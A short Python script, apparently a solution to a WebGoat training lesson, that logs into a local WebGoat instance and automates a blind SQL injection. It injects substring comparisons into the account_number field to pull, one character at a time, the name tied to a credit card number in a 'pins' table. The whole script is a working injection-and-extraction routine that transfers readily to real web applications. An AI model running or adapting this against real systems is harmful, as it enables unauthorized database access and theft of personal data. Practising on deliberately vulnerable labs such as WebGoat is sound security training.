import requests
from bs4 import BeautifulSoup as bs
import string

save = []
alp_sort = string.ascii_uppercase + string.ascii_lowercase

with requests.session() as s:
    params = {'username': 'guest', 'password': 'guest'}     #ID, PW 입력
    
    response = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=params)         #로그인 사이트
    
    for count in range(5):
        for x in alp_sort:
            input_value = {'account_number' : "101 and substr((select name from pins where cc_number='4321432143214321'), " + str(count+1) + ", 1) <= " + "'" + x + "'", 'SUBMIT' : 'Go!'}
            input_I = s.post('http://127.0.0.1:8080/WebGoat/attack?Screen=1315528047&menu=1100', data=input_value)
            in_html = input_I.text
            in_soup = bs(in_html, 'html.parser')
            
            if str(in_soup.select('p')[1]) == '<p>Account number is valid</p>':
                save.append(x)
                break

print("".join(save))